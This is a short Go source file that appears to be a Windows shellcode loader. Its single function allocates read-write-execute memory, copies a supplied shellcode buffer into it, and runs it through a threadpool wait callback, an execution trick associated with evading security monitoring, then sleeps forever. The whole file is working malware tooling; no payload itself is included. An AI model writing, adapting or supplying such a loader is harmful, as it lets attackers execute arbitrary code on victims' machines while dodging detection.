package TT

import (
	"syscall"
	"time"
	"unsafe"
)

var (
	old int
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
	LEN                    = 277
	FALSE                  = 0
)

var (
	kernel32                       = syscall.MustLoadDLL("kernel32.dll")
	ntdll                          = syscall.MustLoadDLL("ntdll.dll")
	VirtualAlloc                   = kernel32.MustFindProc("VirtualAlloc")
	CreateEventW                   = kernel32.MustFindProc("CreateEventW")
	VirtualProtect                 = kernel32.MustFindProc("VirtualProtect")
	SetThreadpoolWait              = kernel32.MustFindProc("SetThreadpoolWait")
	CreateThreadpoolWait           = kernel32.MustFindProc("CreateThreadpoolWait")
	SetEvent                       = kernel32.MustFindProc("SetEvent")
	WaitForThreadpoolWaitCallbacks = kernel32.MustFindProc("WaitForThreadpoolWaitCallbacks")
	RtlMoveMemory                  = ntdll.MustFindProc("RtlMoveMemory")
)

func Callback(shellcode []byte) {
	hEvent, _, _ := CreateEventW.Call(0, 0, 0, 0)

	addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
	if err != nil && err.Error() != "The operation completed successfully." {
		syscall.Exit(0)
	}
	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	//VirtualProtect.Call(addr, LEN, windows.PAGE_EXECUTE_READ, (uintptr)(unsafe.Pointer(&old)))
	ptp_w, _, _ := CreateThreadpoolWait.Call(addr, 0, 0)
	SetThreadpoolWait.Call(ptp_w, hEvent, 0)
	SetEvent.Call(hEvent)
	WaitForThreadpoolWaitCallbacks.Call(ptp_w, FALSE)
	SetEvent.Call(hEvent)
	for {
		time.Sleep(9000)
	}
}
